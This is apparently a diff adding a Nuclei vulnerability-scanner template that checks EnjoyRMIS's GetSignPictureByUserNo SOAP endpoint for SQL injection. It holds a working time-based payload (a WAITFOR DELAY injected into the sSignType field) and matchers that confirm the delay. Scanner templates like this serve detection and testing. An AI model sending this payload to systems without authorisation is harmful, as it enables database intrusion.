@@ -1,0 +1,50 @@
+id: poc-yaml-enjoyrmis-getsignpicturebyuserno-sqli
+
+info:
+  name: EnjoyRMIS GetSignPictureByUserNo SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    SQL Injection vulnerability in EnjoyRMIS GetSignPictureByUserNo functionality.
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(3,8)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        POST /enjoyRMIS_WS/WS/OA/CWSOffice.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetSignPictureByUserNo"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetSignPictureByUserNo xmlns="http://tempuri.org/">
+              <sSignType>1';WAITFOR DELAY '0:0:{{t1}}'--</sSignType>
+              <sUserNo>string</sUserNo>
+            </GetSignPictureByUserNo>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "GetSignPictureByUserNoResponse"
+          - "<sMsg>没有印章或签名记录</sMsg>"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
+      - type: dsl
+        dsl:
+          - 'duration > t1'
+          - 'duration < t2'
